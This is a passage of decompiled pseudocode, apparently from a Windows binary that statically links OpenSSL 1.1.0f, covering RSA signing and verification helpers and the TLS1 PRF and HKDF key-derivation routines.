    }
    v10 = sub_14006B850(v7, *(_DWORD *)v2, *(_QWORD *)(v2 + 8), (__int64)v9);
    sub_140026780(v9);
    if ( v10 <= 0 )
      sub_14002CEF0(v7);
    else
      sub_14001D1A0(a2, 6, v7);
    return (unsigned int)v10;
  }
  return result;
}

//----- (000000014003A070) ----------------------------------------------------
__int64 __fastcall sub_14003A070(__int64 a1)
{
  int v1; // eax
  __int64 result; // rax
  __int64 v4; // rcx

  result = (__int64)sub_14001DC20((unsigned int)(v1 + 48));
  if ( result )
  {
    *(_DWORD *)result = 1024;
    v4 = result + 16;
    *(_DWORD *)(result + 24) = 1;
    *(_DWORD *)(result + 48) = -2;
    *(_QWORD *)(a1 + 40) = result;
    result = 1i64;
    *(_QWORD *)(a1 + 64) = v4;
    *(_DWORD *)(a1 + 72) = 2;
  }
  return result;
}
// 14003A086: variable 'v1' is possibly undefined

//----- (000000014003A0E0) ----------------------------------------------------
__int64 __fastcall sub_14003A0E0(__int64 a1, __int64 a2)
{
  int v2; // eax
  _DWORD *v5; // rax
  _DWORD *v6; // rbx
  __int64 v7; // rdi
  __int64 v8; // rcx
  _DWORD *v9; // rax
  void *v10; // rax

  v5 = sub_14001DC20((unsigned int)(v2 + 48));
  v6 = v5;
  if ( v5 )
  {
    *v5 = 1024;
    v5[6] = 1;
    v5[12] = -2;
    *(_QWORD *)(a1 + 64) = v5 + 4;
    *(_QWORD *)(a1 + 40) = v5;
    *(_DWORD *)(a1 + 72) = 2;
    v7 = *(_QWORD *)(a2 + 40);
    *v5 = *(_DWORD *)v7;
    v8 = *(_QWORD *)(v7 + 8);
    if ( !v8 || (v9 = sub_140026F70(v8), (*((_QWORD *)v6 + 1) = v9) != 0i64) )
    {
      v6[6] = *(_DWORD *)(v7 + 24);
      *((_QWORD *)v6 + 4) = *(_QWORD *)(v7 + 32);
      *((_QWORD *)v6 + 5) = *(_QWORD *)(v7 + 40);
      if ( !*(_QWORD *)(v7 + 64) )
        return 1i64;
      sub_14001D930(*((void **)v6 + 8));
      v10 = sub_14003BAB0(*(const void **)(v7 + 64), *(_QWORD *)(v7 + 72));
      *((_QWORD *)v6 + 8) = v10;
      if ( v10 )
      {
        *((_QWORD *)v6 + 9) = *(_QWORD *)(v7 + 72);
        return 1i64;
      }
    }
  }
  return 0i64;
}
// 14003A109: variable 'v2' is possibly undefined

//----- (000000014003A1F0) ----------------------------------------------------
void __fastcall sub_14003A1F0(__int64 a1)
{
  __int64 v1; // rbx

  v1 = *(_QWORD *)(a1 + 40);
  if ( v1 )
  {
    sub_140026FF0(*(_DWORD **)(v1 + 8));
    sub_14001D930(*(void **)(v1 + 56));
    sub_14001D930(*(void **)(v1 + 64));
    sub_14001D930((void *)v1);
  }
}

//----- (000000014003A260) ----------------------------------------------------
__int64 __fastcall sub_14003A260(__int64 a1, __int64 a2, _QWORD *a3, const void *a4, size_t Size)
{
  __int64 v6; // rbx
  __int64 v10; // rdi
  __int64 v11; // rcx
  int v12; // eax
  size_t v13; // r14
  __int64 result; // rax
  int v15; // eax
  int v16; // eax
  __int64 v17; // rcx
  __int64 v18; // rdx
  unsigned int v19; // eax
  unsigned int v20; // eax
  unsigned int v21; // [rsp+60h] [rbp+8h] BYREF

  v6 = *(_QWORD *)(a1 + 40);
  v10 = *(_QWORD *)(*(_QWORD *)(a1 + 16) + 32i64);
  v11 = *(_QWORD *)(v6 + 32);
  if ( !v11 )
  {
    v18 = (__int64)a4;
    v17 = (unsigned int)Size;
LABEL_23:
    result = sub_14005E320(v17, v18, a2, v10);
LABEL_24:
    if ( (int)result >= 0 )
    {
      *a3 = (int)result;
      return 1i64;
    }
    return result;
  }
  v12 = sub_1400253D0(v11);
  v13 = Size;
  if ( Size != v12 )
  {
    sub_140024610(4, 142, 143, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 118);
    return 0xFFFFFFFFi64;
  }
  if ( (unsigned int)sub_14001D4F0(*(unsigned int **)(v6 + 32)) != 95 )
  {
    v15 = *(_DWORD *)(v6 + 24);
    if ( v15 == 5 )
    {
      if ( (int)sub_14001D700(*(_QWORD *)(a1 + 16)) < v13 + 1 )
      {
        sub_140024610(4, 142, 120, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 134);
        return 0xFFFFFFFFi64;
      }
      if ( !sub_14003AA60(v6, a1) )
      {
        sub_140024610(4, 142, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 138);
        return 0xFFFFFFFFi64;
      }
      memmove(*(void **)(v6 + 56), a4, v13);
      v16 = sub_14001D4F0(*(unsigned int **)(v6 + 32));
      *(_BYTE *)(v13 + *(_QWORD *)(v6 + 56)) = sub_14006CFD0(v16);
      v17 = (unsigned int)(v13 + 1);
      v18 = *(_QWORD *)(v6 + 56);
    }
    else
    {
      if ( v15 == 1 )
      {
        v19 = sub_14001D4F0(*(unsigned int **)(v6 + 32));
        result = sub_14006BD70(v19, (__int64)a4, v13, a2, (int *)&v21, v10);
        if ( (int)result <= 0 )
          return result;
        result = v21;
        goto LABEL_24;
      }
      if ( v15 != 6
        || !sub_14003AA60(v6, a1)
        || !(unsigned int)sub_14006D1E0(
                            v10,
                            *(_BYTE **)(v6 + 56),
                            (__int64)a4,
                            *(int **)(v6 + 32),
                            *(_QWORD *)(v6 + 40),
                            *(_DWORD *)(v6 + 48)) )
      {
        return 0xFFFFFFFFi64;
      }
      v20 = sub_14005E580(v10);
      v18 = *(_QWORD *)(v6 + 56);
      v17 = v20;
    }
    goto LABEL_23;
  }
  if ( *(_DWORD *)(v6 + 24) != 1 )
    return 0xFFFFFFFFi64;
  result = sub_14006C390(0i64, (__int64)a4, v13, a2, (int *)&v21, v10);
  if ( (int)result > 0 )
  {
    result = v21;
    goto LABEL_24;
  }
  return result;
}

//----- (000000014003A4D0) ----------------------------------------------------
__int64 __fastcall sub_14003A4D0(__int64 a1, _OWORD *a2, _QWORD *a3, __int64 a4, size_t a5)
{
  __int64 v5; // rdi
  unsigned int *v10; // rcx
  int v11; // eax
  int v13; // ebx
  int v14; // ebx
  int v15; // eax
  __int64 v16; // rbx
  unsigned int v17; // eax
  size_t v18; // [rsp+60h] [rbp+8h] BYREF

  v5 = *(_QWORD *)(a1 + 40);
  v10 = *(unsigned int **)(v5 + 32);
  v11 = *(_DWORD *)(v5 + 24);
  if ( v10 )
  {
    if ( v11 == 5 )
    {
      if ( !sub_14003AA60(v5, a1) )
        return 0xFFFFFFFFi64;
      v13 = sub_14005E340((unsigned int)a5, a4, *(_QWORD *)(v5 + 56), *(_QWORD *)(*(_QWORD *)(a1 + 16) + 32i64));
      if ( v13 < 1 )
        return 0i64;
      v14 = v13 - 1;
      v15 = sub_14001D4F0(*(unsigned int **)(v5 + 32));
      if ( *(unsigned __int8 *)(*(_QWORD *)(v5 + 56) + v14) != (unsigned int)sub_14006CFD0(v15) )
      {
        sub_140024610(4, 141, 100, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 192);
        return 0i64;
      }
      if ( v14 != (unsigned int)sub_1400253D0(*(_QWORD *)(v5 + 32)) )
      {
        sub_140024610(4, 141, 143, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 197);
        return 0i64;
      }
      if ( a2 )
        memmove(a2, *(const void **)(v5 + 56), v14);
    }
    else
    {
      if ( v11 != 1 )
        return 0xFFFFFFFFi64;
      v16 = *(_QWORD *)(a1 + 16);
      v17 = sub_14001D4F0(v10);
      if ( (int)sub_14006C040(v17, 0i64, 0, a2, &v18, a4, a5, *(_QWORD *)(v16 + 32)) <= 0 )
        return 0i64;
      v14 = v18;
    }
  }
  else
  {
    v14 = sub_14005E340((unsigned int)a5, a4, (__int64)a2, *(_QWORD *)(*(_QWORD *)(a1 + 16) + 32i64));
  }
  if ( v14 < 0 )
    return (unsigned int)v14;
  *a3 = v14;
  return 1i64;
}

//----- (000000014003A690) ----------------------------------------------------
__int64 __fastcall sub_14003A690(__int64 a1, __int64 a2, size_t a3, _QWORD *a4, __int64 a5)
{
  __int64 v5; // rax
  __int64 v7; // rbx
  __int64 v11; // r14
  unsigned int *v12; // rcx
  unsigned int v13; // eax
  int v15; // eax
  int v16; // eax
  size_t v17; // r8
  int v18; // eax
  void *v19; // rax
  int v20; // eax
  size_t v21; // [rsp+50h] [rbp+8h] BYREF

  v5 = *(_QWORD *)(a1 + 16);
  v7 = *(_QWORD *)(a1 + 40);
  v11 = *(_QWORD *)(v5 + 32);
  v12 = *(unsigned int **)(v7 + 32);
  if ( !v12 )
  {
    if ( !*(_QWORD *)(v7 + 56) )
    {
      v18 = sub_14001D700(v5);
      v19 = sub_14001D8E0(v18);
      *(_QWORD *)(v7 + 56) = v19;
      if ( !v19 )
        return 0xFFFFFFFFi64;
    }
    v20 = sub_14005E340((unsigned int)a3, a2, *(_QWORD *)(v7 + 56), v11);
    v17 = v20;
    if ( !v20 )
      return 0i64;
    goto LABEL_17;
  }
  if ( *(_DWORD *)(v7 + 24) == 1 )
  {
    v13 = sub_14001D4F0(v12);
    return sub_14006BED0(v13, a4, a5, a2, a3, v11);
  }
  v15 = sub_1400253D0((__int64)v12);
  if ( a5 != v15 )
  {
    sub_140024610(4, 149, 143, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 233);
    return 0xFFFFFFFFi64;
  }
  v16 = *(_DWORD *)(v7 + 24);
  if ( v16 != 5 )
  {
    if ( v16 != 6 || !sub_14003AA60(v7, a1) )
      return 0xFFFFFFFFi64;
    if ( (int)sub_14005E340((unsigned int)a3, a2, *(_QWORD *)(v7 + 56), v11) > 0 )
      return (int)sub_14006D560(
                    v11,
                    (__int64)a4,
                    *(int **)(v7 + 32),
                    *(int **)(v7 + 40),
                    *(__int8 **)(v7 + 56),
                    *(_DWORD *)(v7 + 48)) > 0;
    return 0i64;
  }
  if ( (int)sub_14003A4D0(a1, 0i64, &v21, a2, a3) > 0 )
  {
    v17 = v21;
LABEL_17:
    if ( v17 == a5 && !memcmp(a4, *(const void **)(v7 + 56), v17) )
      return 1i64;
  }
  return 0i64;
}

//----- (000000014003A860) ----------------------------------------------------
__int64 __fastcall sub_14003A860(__int64 a1, __int64 a2, _QWORD *a3, const void *a4, unsigned int a5)
{
  __int64 v5; // rbx
  unsigned int v10; // ebp
  int v11; // eax
  void *v12; // rax
  __int64 result; // rax
  __int64 v14; // r9
  __int64 v15; // rcx
  __int64 v16; // rdx

  v5 = *(_QWORD *)(a1 + 40);
  if ( *(_DWORD *)(v5 + 24) == 4 )
  {
    v10 = sub_14005E580(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 32i64));
    if ( !*(_QWORD *)(v5 + 56) )
    {
      v11 = sub_14001D700(*(_QWORD *)(a1 + 16));
      v12 = sub_14001D8E0(v11);
      *(_QWORD *)(v5 + 56) = v12;
      if ( !v12 )
        return 0xFFFFFFFFi64;
    }
    if ( !(unsigned int)sub_14006C6A0(
                          *(_BYTE **)(v5 + 56),
                          v10,
                          a4,
                          a5,
                          *(_QWORD *)(v5 + 64),
                          *(_DWORD *)(v5 + 72),
                          *(int **)(v5 + 32),
                          *(_QWORD *)(v5 + 40)) )
      return 0xFFFFFFFFi64;
    v14 = *(_QWORD *)(a1 + 16);
    v15 = v10;
    v16 = *(_QWORD *)(v5 + 56);
  }
  else
  {
    v14 = *(_QWORD *)(a1 + 16);
    v16 = (__int64)a4;
    v15 = a5;
  }
  result = sub_14005E360(v15, v16, a2, *(_QWORD *)(v14 + 32));
  if ( (int)result >= 0 )
  {
    *a3 = (int)result;
    return 1i64;
  }
  return result;
}

//----- (000000014003A980) ----------------------------------------------------
__int64 __fastcall sub_14003A980(unsigned int *a1, int a2)
{
  int v3; // eax
  int v4; // ecx
  unsigned __int64 v6; // rax
  __int64 v7; // rdx

  if ( a1 )
  {
    v3 = sub_14001D4F0(a1);
    v4 = v3;
    if ( a2 == 3 )
    {
      sub_140024610(4, 140, 141, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 334);
      return 0i64;
    }
    if ( a2 == 5 )
    {
      if ( (unsigned int)sub_14006CFD0(v3) == -1 )
      {
        sub_140024610(4, 140, 142, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 340);
        return 0i64;
      }
    }
    else
    {
      v6 = (unsigned int)(v3 - 64);
      if ( (unsigned int)v6 > 0x35 || (v7 = 0x24000080000001i64, !_bittest64(&v7, v6)) )
      {
        if ( (unsigned int)(v4 - 3) > 1 && v4 != 257 && (unsigned int)(v4 - 672) > 3 )
        {
          sub_140024610(4, 140, 157, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 360);
          return 0i64;
        }
      }
    }
  }
  return 1i64;
}

//----- (000000014003AA60) ----------------------------------------------------
_BOOL8 __fastcall sub_14003AA60(__int64 a1, __int64 a2)
{
  int v4; // eax
  void *v5; // rax

  if ( *(_QWORD *)(a1 + 56) )
    return 1i64;
  v4 = sub_14001D700(*(_QWORD *)(a2 + 16));
  v5 = sub_14001D8E0(v4);
  *(_QWORD *)(a1 + 56) = v5;
  return v5 != 0i64;
}

//----- (000000014003AAC0) ----------------------------------------------------
__int64 __fastcall sub_14003AAC0(__int64 a1)
{
  __int64 result; // rax

  result = (__int64)sub_14001DC20(0x420ui64);
  if ( result )
  {
    *(_QWORD *)(a1 + 40) = result;
    return 1i64;
  }
  return result;
}

//----- (000000014003AB10) ----------------------------------------------------
void __fastcall sub_14003AB10(__int64 a1)
{
  int v1; // eax
  __int64 v2; // rbx

  v2 = *(_QWORD *)(a1 + 40);
  sub_14001DA40(
    *(void **)(v2 + 8),
    *(_QWORD *)(v2 + 16),
    (__int64)"..\\..\\openssl-1.1.0f\\crypto\\kdf\\tls1_prf.c",
    v1 + 19);
  sub_140023440(v2 + 24, *(_QWORD *)(v2 + 1048));
  sub_14001D930((void *)v2);
}
// 14003AB23: variable 'v1' is possibly undefined

//----- (000000014003AB70) ----------------------------------------------------
__int64 __fastcall sub_14003AB70(__int64 a1, int a2, int a3, const void *a4)
{
  _QWORD *v4; // rdi
  size_t v6; // rbx
  int v7; // edx
  int v8; // edx
  void *v10; // rcx
  void *v11; // rax

  v4 = *(_QWORD **)(a1 + 40);
  v6 = a3;
  v7 = a2 - 4096;
  if ( !v7 )
  {
    *v4 = a4;
    return 1i64;
  }
  v8 = v7 - 1;
  if ( !v8 )
  {
    if ( a3 >= 0 )
    {
      v10 = (void *)v4[1];
      if ( v10 )
        sub_14001DA40(v10, v4[2], (__int64)"..\\..\\openssl-1.1.0f\\crypto\\kdf\\tls1_prf.c", 0x44u);
      sub_140023440((__int64)(v4 + 3), v4[131]);
      v4[131] = 0i64;
      v11 = sub_14003BAB0(a4, v6);
      v4[1] = v11;
      if ( v11 )
      {
        v4[2] = v6;
        return 1i64;
      }
    }
    return 0i64;
  }
  if ( v8 != 1 )
    return 4294967294i64;
  if ( !a3 || !a4 )
    return 1i64;
  if ( a3 < 0 || a3 > 1024 - *((_DWORD *)v4 + 262) )
    return 0i64;
  memmove((char *)v4 + v4[131] + 24, a4, a3);
  v4[131] += v6;
  return 1i64;
}

//----- (000000014003ACA0) ----------------------------------------------------
__int64 __fastcall sub_14003ACA0(__int64 a1, __int64 a2, char *a3)
{
  int v3; // eax
  __int64 *v8; // rbx
  __int64 v9; // rax
  __int64 v10; // rbx
  __int64 v11; // rcx
  char v12; // al
  __int64 v13; // rcx
  char v14; // al
  char v15; // al

  if ( a3 )
  {
    if ( *(_BYTE *)a2 == 109 && *(_BYTE *)(a2 + 1) == 100 && !*(_BYTE *)(a2 + 2) )
    {
      v8 = *(__int64 **)(a1 + 40);
      v9 = sub_14001E990((__int64)a3);
      if ( v9 )
      {
        *v8 = v9;
        return 1i64;
      }
      else
      {
        sub_140024610(52, 100, 100, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\kdf\\tls1_prf.c", 104);
        return 0i64;
      }
    }
    else
    {
      v10 = 0i64;
      v11 = 0i64;
      while ( 1 )
      {
        v12 = *(_BYTE *)(a2 + v11++);
        if ( v12 != aSecret[v11 - 1] )
          break;
        if ( v11 == 7 )
          return sub_1400207C0(a1, 4097i64, a3);
      }
      if ( !strcmp((const char *)a2, "hexsecret") )
      {
        return (__int64)sub_1400206E0(a1, 0x1001u, a3);
      }
      else
      {
        v13 = 0i64;
        while ( 1 )
        {
          v14 = *(_BYTE *)(a2 + v13++);
          if ( v14 != aSeed_0[v13 - 1] )
            break;
          if ( v13 == 5 )
            return sub_1400207C0(a1, 4098i64, a3);
        }
        while ( 1 )
        {
          v15 = *(_BYTE *)(a2 + v10++);
          if ( v15 != aHexseed[v10 - 1] )
            break;
          if ( v10 == 8 )
            return (__int64)sub_1400206E0(a1, 0x1002u, a3);
        }
        return 4294967294i64;
      }
    }
  }
  else
  {
    sub_140024610(v3 + 4, v3 + 52, v3 + 54, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\kdf\\tls1_prf.c", 96);
    return 0i64;
  }
}
// 14003ACD8: variable 'v3' is possibly undefined

//----- (000000014003AE40) ----------------------------------------------------
__int64 __fastcall sub_14003AE40(__int64 a1, char *a2, size_t *a3)
{
  __int64 v5; // r8
  __int64 v6; // rdx
  __int64 v7; // r10

  v5 = *(_QWORD *)(a1 + 40);
  if ( *(_QWORD *)v5 )
  {
    v6 = *(_QWORD *)(v5 + 8);
    if ( v6 )
    {
      v7 = *(_QWORD *)(v5 + 1048);
      if ( v7 )
        return sub_14003B140(*(int **)v5, v6, *(_QWORD *)(v5 + 16), v5 + 24, v7, a2, *a3);
    }
  }
  sub_140024610(52, 101, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\kdf\\tls1_prf.c", 126);
  return 0i64;
}

//----- (000000014003AEC0) ----------------------------------------------------
__int64 __fastcall sub_14003AEC0(int *a1, __int64 a2, unsigned int a3, __int64 a4, __int64 a5, char *a6, size_t Size)
{
  _QWORD *v12; // rbx
  _QWORD *v13; // r12
  void *v14; // rax
  void *v15; // r15
  __int64 *v16; // rax
  unsigned int v19; // [rsp+30h] [rbp-B8h]
  int v20; // [rsp+34h] [rbp-B4h]
  __int64 v21; // [rsp+38h] [rbp-B0h] BYREF
  __int64 *v22; // [rsp+40h] [rbp-A8h]
  __int64 v23; // [rsp+48h] [rbp-A0h] BYREF
  char Src[64]; // [rsp+50h] [rbp-98h] BYREF

  v22 = 0i64;
  v19 = 0;
  v20 = sub_1400253D0((__int64)a1);
  if ( v20 < 0 )
    sub_1400234A0("assertion failed: chunk >= 0", "..\\..\\openssl-1.1.0f\\crypto\\kdf\\tls1_prf.c", 177i64);
  v12 = sub_14006DFD0();
  v13 = sub_14006DFD0();
  v14 = sub_14006DFD0();
  v15 = v14;
  if ( v12 )
  {
    if ( v13 )
    {
      if ( v14 )
      {
        sub_1400252B0((__int64)v14, 8);
        v16 = sub_14001EB80(0x357u, 0i64, a2, a3);
        v22 = v16;
        if ( v16 )
        {
          if ( (unsigned int)sub_14006E290((__int64)v15, 0i64, a1, 0i64, (__int64)v16)
            && (unsigned int)sub_14006DDB0(v12, (__int64)v15)
            && (!a4 || (unsigned int)sub_14006DD90((__int64)v12))
            && (unsigned int)sub_14006E0B0((__int64)v12, (__int64)Src, &v21)
            && (unsigned int)sub_14006DDB0(v12, (__int64)v15) )
          {
            while ( (unsigned int)sub_14006DD90((__int64)v12)
                 && (Size <= v20 || (unsigned int)sub_14006DDB0(v13, (__int64)v12))
                 && (!a4 || (unsigned int)sub_14006DD90((__int64)v12)) )
            {
              if ( Size <= v20 )
              {
                if ( (unsigned int)sub_14006E0B0((__int64)v12, (__int64)Src, &v21) )
                {
                  memmove(a6, Src, Size);
                  v19 = 1;
                }
                break;
              }
              if ( (unsigned int)sub_14006E0B0((__int64)v12, (__int64)a6, &v23) )
              {
                a6 += v23;
                Size -= v23;
                if ( (unsigned int)sub_14006E0B0((__int64)v13, (__int64)Src, &v21) )
                {
                  if ( (unsigned int)sub_14006DDB0(v12, (__int64)v15) )
                    continue;
                }
              }
              break;
            }
          }
        }
      }
    }
  }
  sub_14001D3C0((__int64)v22);
  sub_14006DF90(v12);
  sub_14006DF90(v13);
  sub_14006DF90(v15);
  sub_140023440((__int64)Src, 64i64);
  return v19;
}

//----- (000000014003B140) ----------------------------------------------------
__int64 __fastcall sub_14003B140(
        int *a1,
        __int64 a2,
        unsigned __int64 a3,
        __int64 a4,
        __int64 a5,
        char *a6,
        size_t Size)
{
  unsigned int v11; // r13d
  int *v12; // rax
  __int64 result; // rax
  char *v14; // rsi
  int *v15; // rax
  size_t v16; // rcx
  const __m128i *v17; // rax
  signed __int64 v18; // rdx
  __m128i v19; // xmm0
  __m128i v20; // xmm1
  char *v21; // rax
  size_t v22; // rdx

  if ( (unsigned int)sub_14001D4F0((unsigned int *)a1) != 114 )
    return (unsigned int)sub_14003AEC0(a1, a2, a3, a4, a5, a6, Size) != 0;
  v11 = (a3 & 1) + (a3 >> 1);
  v12 = (int *)sub_14005B3C0();
  result = sub_14003AEC0(v12, a2, v11, a4, a5, a6, Size);
  if ( (_DWORD)result )
  {
    v14 = (char *)sub_14001D8E0(Size);
    if ( !v14 )
      return 0i64;
    v15 = (int *)sub_14005BAC0();
    if ( !(unsigned int)sub_14003AEC0(v15, (a3 >> 1) + a2, v11, a4, a5, v14, Size) )
    {
      sub_14001DA40(v14, Size, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\kdf\\tls1_prf.c", 0xFDu);
      return 0i64;
    }
    v16 = 0i64;
    if ( Size )
    {
      if ( Size >= 0x20 && (a6 > &v14[Size - 1] || &a6[Size - 1] < v14) )
      {
        v17 = (const __m128i *)a6;
        v18 = v14 - a6;
        do
        {
          v19 = _mm_loadu_si128(v17);
          v16 += 32i64;
          v20 = _mm_loadu_si128((const __m128i *)((char *)v17 + v18));
          v17 += 2;
          v17[-2] = _mm_xor_si128(v20, v19);
          v17[-1] = _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v17 + v18 - 16)), _mm_loadu_si128(v17 - 1));
        }
        while ( v16 < (Size & 0xFFFFFFFFFFFFFFE0ui64) );
      }
      if ( v16 < Size )
      {
        v21 = &a6[v16];
        v22 = Size - v16;
        do
        {
          *v21 ^= v21[v14 - a6];
          ++v21;
          --v22;
        }
        while ( v22 );
      }
    }
    sub_14001DA40(v14, Size, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\kdf\\tls1_prf.c", 0x102u);
    return 1i64;
  }
  return result;
}

//----- (000000014003B370) ----------------------------------------------------
__int64 __fastcall sub_14003B370(__int64 a1)
{
  __int64 result; // rax

  result = (__int64)sub_14001DC20(0x430ui64);
  if ( result )
  {
    *(_QWORD *)(a1 + 40) = result;
    return 1i64;
  }
  return result;
}

//----- (000000014003B3C0) ----------------------------------------------------
void __fastcall sub_14003B3C0(__int64 a1)
{
  int v1; // eax
  __int64 v2; // rbx

  v2 = *(_QWORD *)(a1 + 40);
  sub_14001DA40(
    *(void **)(v2 + 8),
    *(_QWORD *)(v2 + 16),
    (__int64)"..\\..\\openssl-1.1.0f\\crypto\\kdf\\hkdf.c",
    v1 + 30);
  sub_14001DA40(
    *(void **)(v2 + 24),
    *(_QWORD *)(v2 + 32),
    (__int64)"..\\..\\openssl-1.1.0f\\crypto\\kdf\\hkdf.c",
    0x3Fu);
  sub_140023440(v2 + 40, *(_QWORD *)(v2 + 1064));
  sub_14001D930((void *)v2);
}
// 14003B3D3: variable 'v1' is possibly undefined

//----- (000000014003B430) ----------------------------------------------------
__int64 __fastcall sub_14003B430(__int64 a1, int a2, int a3, const void *a4)
{
  __int64 v4; // rdi
  size_t v6; // rbx
  int v7; // edx
  int v8; // edx
  int v9; // edx
  void *v11; // rcx
  void *v12; // rax
  void *v13; // rcx
  void *v14; // rax

  v4 = *(_QWORD *)(a1 + 40);
  v6 = a3;
  v7 = a2 - 4099;
  if ( !v7 )
  {
    if ( a4 )
    {
      *(_QWORD *)v4 = a4;
      return 1i64;
    }
    return 0i64;
  }
  v8 = v7 - 1;
  if ( !v8 )
  {
    if ( !a3 || !a4 )
      return 1i64;
    if ( a3 >= 0 )
    {
      v13 = *(void **)(v4 + 8);
      if ( v13 )
        sub_14001DA40(v13, *(_QWORD *)(v4 + 16), (__int64)"..\\..\\openssl-1.1.0f\\crypto\\kdf\\hkdf.c", 0x58u);
      v14 = sub_14003BAB0(a4, v6);
      *(_QWORD *)(v4 + 8) = v14;
      if ( v14 )
      {
        *(_QWORD *)(v4 + 16) = v6;
        return 1i64;
      }
    }
    return 0i64;
  }
  v9 = v8 - 1;
  if ( !v9 )
  {
    if ( a3 >= 0 )
    {
      v11 = *(void **)(v4 + 24);
      if ( v11 )
        sub_14001DA40(v11, *(_QWORD *)(v4 + 32), (__int64)"..\\..\\openssl-1.1.0f\\crypto\\kdf\\hkdf.c", 0x66u);
      v12 = sub_14003BAB0(a4, v6);
      *(_QWORD *)(v4 + 24) = v12;
      if ( v12 )
      {
        *(_QWORD *)(v4 + 32) = v6;
        return 1i64;
      }
    }
    return 0i64;
  }
  if ( v9 != 1 )
    return 4294967294i64;
  if ( !a3 || !a4 )
    return 1i64;
  if ( a3 < 0 || a3 > 1024 - *(_DWORD *)(v4 + 1064) )
    return 0i64;
  memmove((void *)(*(_QWORD *)(v4 + 1064) + v4 + 40), a4, a3);
  *(_QWORD *)(v4 + 1064) += v6;
  return 1i64;
}

//----- (000000014003B5B0) ----------------------------------------------------
__int64 __fastcall sub_14003B5B0(__int64 *a1, _BYTE *a2, char *a3)
{
  __int64 v5; // rax
  __int64 v7; // rcx
  __int64 v8; // r8
  char v9; // al
  __int64 v10; // r8
  char v11; // al
  __int64 v12; // r8
  char v13; // al
  __int64 v14; // r8
  char v15; // al
  __int64 v16; // r8
  char v17; // al
  char v18; // al

  if ( *a2 == 109 && a2[1] == 100 && !a2[2] )
  {
    v5 = sub_14001E990((__int64)a3);
    return sub_140020440(a1, -1, 1024, 0x1003u, 0, v5);
  }
  else
  {
    v7 = 0i64;
    v8 = 0i64;
    while ( 1 )
    {
      v9 = a2[v8++];
      if ( v9 != aSalt[v8 - 1] )
        break;
      if ( v8 == 5 )
        return sub_1400207C0((__int64)a1, 4100i64, a3);
    }
    v10 = 0i64;
    while ( 1 )
    {
      v11 = a2[v10++];
      if ( v11 != aHexsalt[v10 - 1] )
        break;
      if ( v10 == 8 )
        return (__int64)sub_1400206E0((__int64)a1, 0x1004u, a3);
    }
    v12 = 0i64;
    while ( 1 )
    {
      v13 = a2[v12++];
      if ( v13 != aKey[v12 - 1] )
        break;
      if ( v12 == 4 )
        return sub_1400207C0((__int64)a1, 4101i64, a3);
    }
    v14 = 0i64;
    while ( 1 )
    {
      v15 = a2[v14++];
      if ( v15 != aHexkey[v14 - 1] )
        break;
      if ( v14 == 7 )
        return (__int64)sub_1400206E0((__int64)a1, 0x1005u, a3);
    }
    v16 = 0i64;
    while ( 1 )
    {
      v17 = a2[v16++];
      if ( v17 != aInfo[v16 - 1] )
        break;
      if ( v16 == 5 )
        return sub_1400207C0((__int64)a1, 4102i64, a3);
    }
    while ( 1 )
    {
      v18 = a2[v7++];
      if ( v18 != aHexinfo[v7 - 1] )
        break;
      if ( v7 == 8 )
        return (__int64)sub_1400206E0((__int64)a1, 0x1006u, a3);
    }
    return 4294967294i64;
  }
}

//----- (000000014003B7A0) ----------------------------------------------------
_BOOL8 __fastcall sub_14003B7A0(__int64 a1, __int64 a2, unsigned __int64 *a3)
{
  __int64 v4; // rdx
  __int64 v5; // r9

  v4 = *(_QWORD *)(a1 + 40);
  return *(_QWORD *)v4
      && (v5 = *(_QWORD *)(v4 + 24)) != 0
      && sub_14003B820(
           *(int **)v4,
           *(const void **)(v4 + 8),
           *(_QWORD *)(v4 + 16),
           v5,
           *(_QWORD *)(v4 + 32),
           v4 + 40,
           *(_QWORD *)(v4 + 1064),
           a2,
           *a3) != 0i64;
}

//----- (000000014003B820) ----------------------------------------------------
void *__fastcall sub_14003B820(
        int *a1,
        const void *a2,
        int a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        unsigned __int64 a9)
{
  void *result; // rax
  int v11[4]; // [rsp+40h] [rbp-78h] BYREF
  char v12[64]; // [rsp+50h] [rbp-68h] BYREF

  result = sub_14006B0C0(a1, a2, a3, a4, a5, v12, v11);
  if ( result )
    return (void *)sub_14003B8E0(a1, v12, v11[0], a6, a7, a8, a9);
  return result;
}
// 14003B820: using guessed type int var_78[4];

//----- (000000014003B8E0) ----------------------------------------------------
__int64 __fastcall sub_14003B8E0(
        int *a1,
        const void *a2,
        int a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        unsigned __int64 a7)
{
  __int64 v10; // rbp
  size_t v11; // r14
  unsigned __int64 v12; // r13
  _QWORD *v14; // rax
  _QWORD *v15; // rbx
  unsigned int v16; // esi
  size_t v17; // rdi
  char Src[64]; // [rsp+50h] [rbp-98h] BYREF

  v10 = 0i64;
  v11 = (int)sub_1400253D0((__int64)a1);
  v12 = a7 / v11 + 1;
  if ( !(a7 % v11) )
    v12 = a7 / v11;
  if ( v12 > 0xFF )
    return 0i64;
  v14 = sub_14006B370();
  v15 = v14;
  if ( v14 )
  {
    if ( sub_14006B5B0((__int64)v14, a2, a3, a1, 0i64) )
    {
      v16 = 1;
      if ( !v12 )
      {
LABEL_17:
        sub_14006B2F0(v15);
        return a6;
      }
      while ( (v16 <= 1 || sub_14006B5B0((__int64)v15, 0i64, 0, 0i64, 0i64) && (unsigned int)sub_14006B820(v15))
